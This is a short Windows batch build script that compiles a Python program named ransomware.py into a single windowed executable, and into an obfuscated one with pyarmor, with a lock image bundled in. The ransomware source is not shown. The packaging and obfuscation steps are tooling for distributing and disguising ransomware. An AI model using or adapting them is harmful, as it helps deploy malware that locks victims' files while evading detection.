@echo on

@REM GUI to build a .exe
@REM auto-py-to-exe.exe

@REM pyinstaller --noconfirm --onefile --windowed --add-data "./lock.png;."  ransomware.py

@REM Obfuscated .exe
@REM Note: Use "" for pyarmor -e and for the internal strings '' (single quotes)
pyarmor pack -e "--onefile --windowed --add-data './lock.png;.'" ransomware.py
